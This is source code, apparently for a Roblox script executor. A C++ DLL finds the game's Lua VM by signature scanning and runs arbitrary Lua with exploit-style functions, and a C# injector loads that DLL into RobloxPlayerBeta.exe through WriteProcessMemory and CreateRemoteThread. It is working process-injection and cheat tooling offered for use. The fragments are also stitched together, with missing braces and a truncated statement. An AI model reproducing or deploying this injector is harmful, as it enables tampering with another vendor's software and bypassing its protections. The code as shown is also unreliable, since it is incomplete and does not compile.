bool Lua::Wrapper::ScheduleScript(const std::string& source) noexcept {
    if (!m_initialized || !m_funcs.luaL_loadbuffer) return false;

    int result = m_funcs.luaL_loadbuffer(
        m_luaState,
        source.c_str(),
        source.size(),
        "@unc_exec"
    );

    if (result != 0) {
        const char* err = m_funcs.lua_tostring
                          ? m_funcs.lua_tostring(m_luaState, -1)
                          : "unknown";
        DevConsole::LogError(
            std::format("ScheduleScript compile error: {}",
                        err ? err : "unknown"));
        if (m_funcs.lua_settop) m_funcs.lua_settop(m_luaState, 0);
        return false;
    }

    if (m_funcs.lua_pcall)
        m_funcs.lua_pcall(m_luaState, 0, 0, 0);

    return true;
}

// ============================================================
// WaitForTarget — blocks until RobloxPlayerBeta.exe is
// the foreground process and the game has fully initialized.
// Checks for the presence of the DataModel (a key game object)
// by looking for a non-null return from a known global scan.
// ============================================================
static bool WaitForTarget(uint32_t timeoutMs = 30'000) noexcept {
    auto start = std::chrono::steady_clock::now();
    auto deadline = start + std::chrono::milliseconds(timeoutMs);

    while (std::chrono::steady_clock::now() < deadline) {
        // Check that we're running inside the target process
        HMODULE hRbx = GetModuleHandleA("RobloxPlayerBeta.exe");
        if (!hRbx) {
            // We might be in a different process — this is an error
            return false;
        }

        // Wait until the Lua VM appears to be initialized:
        // Attempt to find the print function signature.
        // If not found yet, the game's Lua VM isn't ready.
        uintptr_t printSig = Memory::ScanModule(RbxOffsets::PRINT_SIG);
        if (printSig != 0) {
            // Additional sanity: try reading the lua_State pointer
            uintptr_t instrAddr = printSig + RbxOffsets::PRINT_TO_LSTATE_OFFSET;
            auto b0 = Memory::Read<uint8_t>(instrAddr);
            if (b0 && *b0 == 0x48) {
                return true; // VM is ready
            }
        }

        std::this_thread::sleep_for(std::chrono::milliseconds(500));
    }
    return false; // Timed out
}

// InitThread — the main DLL worker thread
// Runs on a separate thread spawned by DllMain to avoid
// holding the loader lock during potentially slow operations
// (signature scanning, memory reads, etc.)
// ============================================================
static DWORD WINAPI InitThread(LPVOID /*param*/) {
    g_running = true;

    // ---- Step 1: Wait for game VM readiness ----
    if (!WaitForTarget(30'000)) {
        // Target not found or timed out — unload cleanly
        g_running = false;
        FreeLibraryAndExitThread(g_hModule, 1);
        return 1;
    }

    // ---- Step 2: Initialize Lua::Wrapper ----
    auto& vm = Lua::Wrapper::Instance();
    if (!vm.Initialize()) {
        // Could not acquire lua_State — signature stale?
        g_running = false;
        FreeLibraryAndExitThread(g_hModule, 2);
        return 2;
    }

    // ---- Step 3: Initialize DevConsole ----
    bool consoleOk = DevConsole::Initialize(vm.GetState());
    if (!consoleOk) {
        // DevConsole init failed — non-fatal, continue without logging
        // (fall back to OutputDebugStringA for debugging)
        OutputDebugStringA("[RBX-UNC] DevConsole init failed, continuing...\n");
    }

    DevConsole::LogTagged("UNC",
        std::format("Attached | lua_State @ 0x{:016X}", vm.GetState()), 0);

    // ---- Step 4: Register all UNC functions ----
    uintptr_t L = vm.GetState();
    UNC::RegisterAll(L);

    DevConsole::LogTagged("UNC", "All UNC functions registered", 0);

    // ---- Step 5: Run self-test ----
    // Execute a minimal Lua snippet to verify the environment works
    constexpr const char* SELFTEST_SRC = R"(
        local genv = getgenv()
        assert(type(genv) == "table", "getgenv failed")

        local reg = getreg()
        assert(type(reg) == "table", "getreg failed")

        local gc = getgc(false)
        assert(type(gc) == "table", "getgc failed")

        -- Signal success to the developer console
        print("[RBX-UNC] Self-test passed!")
    )";

    if (!vm.ScheduleScript(SELFTEST_SRC)) {
        DevConsole::LogWarn("Self-test script failed to execute");
    }

    DevConsole::LogTagged("UNC",
        "Initialization complete. RBX-UNC is active.", 0);

    // ---- Main loop: keep DLL alive ----
    // In a real implementation, you might pump a command queue here,
    // accepting scripts from an IPC channel (named pipe, etc.)
    while (g_running.load(std::memory_order_relaxed)) {
        std::this_thread::sleep_for(std::chrono::milliseconds(100));
    }

    // ---- Cleanup ----
    DevConsole::LogTagged("UNC", "Detaching...", 0);
    g_running = false;
    FreeLibraryAndExitThread(g_hModule, 0);
    return 0;
}

// ============================================================
// DllMain — CRT entry point
// Called by Windows loader on DLL attach/detach
// ============================================================
BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID /*lpvReserved*/) {
    switch (fdwReason) {

    case DLL_PROCESS_ATTACH:
        // Disable per-thread DllMain calls (optimization)
        DisableThreadLibraryCalls(hinstDLL);
        g_hModule = static_cast<HMODULE>(hinstDLL);

        // Spawn the initialization thread.
        // We MUST not do heavy work here — loader lock is held!
        {
            HANDLE hThread = CreateThread(
                nullptr,       // default security
                0,             // default stack size
                InitThread,    // thread function
                nullptr,       // no param
                0,             // run immediately
                nullptr        // don't need thread ID
            );
            if (hThread) CloseHandle(hThread); // Thread manages its own lifetime
        }
        break;

    case DLL_PROCESS_DETACH:
        // Signal the worker thread to stop
        g_running = false;
        // Brief yield to let the thread clean up
        // (In production, use an event/semaphore for clean shutdown)
        std::this_thread::sleep_for(std::chrono::milliseconds(200));
        break;

    case DLL_THREAD_ATTACH:
    case DLL_THREAD_DETACH:
        // Disabled by DisableThreadLibraryCalls above
        break;
    }
    return TRUE;
}

        private IntPtr _hProcess = IntPtr.Zero;
        private IntPtr _allocAddr = IntPtr.Zero;

        // ---- Public API ----

        /// <summary>
        /// Find the target process, open a handle, inject the DLL,
        /// and verify the thread exit code (LoadLibraryA return value).
        /// </summary>
        public InjectionResult Inject(string dllPath) {
            ObjectDisposedException.ThrowIf(_disposed, this);

            // Validate DLL path
            if (!File.Exists(dllPath))
                return InjectionResult.DllNotFound;

            // Resolve to absolute path (LoadLibraryA needs this
            // or the remote process won't find the file)
            dllPath = Path.GetFullPath(dllPath);

            // Find target process
            Process? target = FindTargetProcess();
            if (target is null)
                return InjectionResult.ProcessNotFound;

            Console.WriteLine($"[Injector] Found {TARGET_PROCESS} | PID: {target.Id}");

            // Open process handle with full access
            _hProcess = NativeMethods.OpenProcess(
                NativeMethods.PROCESS_ALL_ACCESS,
                false,
                target.Id);

            if (_hProcess == IntPtr.Zero) {
                int err = Marshal.GetLastWin32Error();
                Console.WriteLine($"[Injector] OpenProcess failed: Win32 error {err}");
                return InjectionResult.HandleOpenFailed;
            }

            try {
                return InjectInternal(dllPath);
            } finally {
                // Always release the process handle
                if (_hProcess != IntPtr.Zero) {
                    NativeMethods.CloseHandle(_hProcess);
                    _hProcess = IntPtr.Zero;
                }
            }
        }

        // ---- Private Implementation ----

        private InjectionResult InjectInternal(string dllPath) {
            // Step 1: Encode the DLL path as null-terminated UTF-8 bytes
            byte[] pathBytes = Encoding.UTF8.GetBytes(dllPath + '\0');

            // Step 2: Allocate memory in the target process for the path string
            _allocAddr = NativeMethods.VirtualAllocEx(
                _hProcess,
                IntPtr.Zero,
                pathBytes.Length,
                NativeMethods.MEM_COMMIT | NativeMethods.MEM_RESERVE,
                NativeMethods.PAGE_READWRITE);

            if (_allocAddr == IntPtr.Zero) {
                int err = Marshal.GetLastWin32Error();
                Console.WriteLine($"[Injector] VirtualAllocEx failed: Win32 error {err}");
                return InjectionResult.AllocFailed;

            Console.WriteLine($"[Injector] Allocated {pathBytes.Length} bytes " +

            // Step 3: Write the DLL path into the allocated remote memory
            bool writeOk = NativeMethods.WriteProcessMemory(
                _hProcess,
                _allocAddr,
                pathBytes,
                pathBytes.Length,
                out nint bytesWritten);

            if (!writeOk || bytesWritten != pathBytes.Length) {
                int err = Marshal.GetLastWin32Error();
                Console.WriteLine($"[Injector] WriteProcessMemory failed: " +
                                  $"Win32 error {err} | wrote {bytesWritten}/{pathBytes.Length}");
                FreeRemoteMemory();
                return InjectionResult.WriteFailed;
            }

            // Step 4: Get address of LoadLibraryA in kernel32.dll
            // Because kernel32 is loaded at the same base in all processes
            // (ASLR applies per-boot, not per-process for kernel32),
            // we can get the address from OUR process and use it in the target.
            IntPtr kernel32 = NativeMethods.GetModuleHandle("kernel32.dll");
            IntPtr loadLibraryA = NativeMethods.GetProcAddress(kernel32, "LoadLibraryA");

            if (loadLibraryA == IntPtr.Zero) {
                Console.WriteLine("[Injector] GetProcAddress(LoadLibraryA) failed");
                FreeRemoteMemory();
                return InjectionResult.ThreadCreateFailed;
            }

            Console.WriteLine($"[Injector] LoadLibraryA @ 0x{loadLibraryA:X16}");

            // Step 5: Create a remote thread that calls LoadLibraryA(dllPath)
            IntPtr hThread = NativeMethods.CreateRemoteThread(
                _hProcess,
                IntPtr.Zero,     // default security attributes
                0,               // default stack size
                loadLibraryA,    // start address = LoadLibraryA
                _allocAddr,      // argument = pointer to DLL path string
                0,               // run immediately
                IntPtr.Zero);    // don't need thread ID

            if (hThread == IntPtr.Zero) {
                int err = Marshal.GetLastWin32Error();
                Console.WriteLine($"[Injector] CreateRemoteThread failed: Win32 error {err}");
                FreeRemoteMemory();
                return InjectionResult.ThreadCreateFailed;
            }

            Console.WriteLine($"[Injector] Remote thread created @ 0x{hThread:X16}");
            Console.WriteLine($"[Injector] Waiting for LoadLibraryA to complete...");

            try {
                // Step 6: Wait for the remote thread to finish
                uint waitResult = NativeMethods.WaitForSingleObject(
                    hThread,
                    WAIT_TIMEOUT_MS);

                if (waitResult != NativeMethods.WAIT_OBJECT_0) {
                    Console.WriteLine($"[Injector] Thread wait failed/timeout: 0x{waitResult:X8}");
                    return InjectionResult.ThreadWaitFailed;
                }

                // Step 7: Check thread exit code
                // LoadLibraryA returns the HMODULE on success, NULL on failure.
                // The exit code is the low 32 bits of the return value.
                bool exitOk = NativeMethods.GetExitCodeThread(
                    hThread, out uint exitCode);

                if (!exitOk || exitCode == 0) {
                    Console.WriteLine($"[Injector] LoadLibraryA returned NULL — " +
                                      "check DLL path and dependencies");
                    return InjectionResult.LoadLibraryFailed;
                }

                Console.WriteLine($"[Injector] DLL loaded successfully at 0x{exitCode:X8}");
                return InjectionResult.Success;
            } finally {
                NativeMethods.CloseHandle(hThread);
                // Note: we intentionally do NOT free _allocAddr here.
                // Freeing it before the DLL's DllMain returns would be
                // safe (the path is already consumed by LoadLibraryA),
                // but we add a small delay for safety.
                Thread.Sleep(500);
                FreeRemoteMemory();
            }
        }

        private void FreeRemoteMemory() {
            if (_allocAddr != IntPtr.Zero && _hProcess != IntPtr.Zero) {
                NativeMethods.VirtualFreeEx(
                    _hProcess, _allocAddr, 0, NativeMethods.MEM_RELEASE);
                _allocAddr = IntPtr.Zero;
            }
        }

        private static Process? FindTargetProcess() {
            Process[] procs = Process.GetProcessesByName(TARGET_PROCESS);
            if (procs.Length == 0) return null;
            // If multiple instances exist, return the most recently started
            Array.Sort(procs,
                (a, b) => b.StartTime.CompareTo(a.StartTime));
            return procs[0];
        }

        public void Dispose() {
            if (_disposed) return;
            _disposed = true;
            if (_hProcess != IntPtr.Zero) {
                NativeMethods.CloseHandle(_hProcess);
                _hProcess = IntPtr.Zero;
            }
        }

                        Console.WriteLine($"[-] Process not found. " +
                                          $"Retrying in {RETRY_DELAY_MS}ms...");
                        Thread.Sleep(RETRY_DELAY_MS);
                        retries++;
                        continue;

                    case InjectionResult.HandleOpenFailed:
                        Console.ForegroundColor = ConsoleColor.Yellow;
                        Console.WriteLine("[!] Could not open process handle.");
                        Console.WriteLine("    Try running as Administrator.");
                        Console.ResetColor();
                        return (int)result;

                    case InjectionResult.LoadLibraryFailed:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine("[!] LoadLibraryA failed in target.");
                        Console.WriteLine("    Check DLL dependencies (x64 build?)");
                        Console.ResetColor();
                        return (int)result;

                    default:
                        Console.ForegroundColor = ConsoleColor.Red;
                        Console.WriteLine($"[!] Injection failed: {result}");
                        Console.ResetColor();
                        return (int)result;
                }
            }

            Console.WriteLine("[!] Max retries exceeded. Aborting.");
            return (int)InjectionResult.ProcessNotFound;
        }
    }

} // namespace RbxUnc
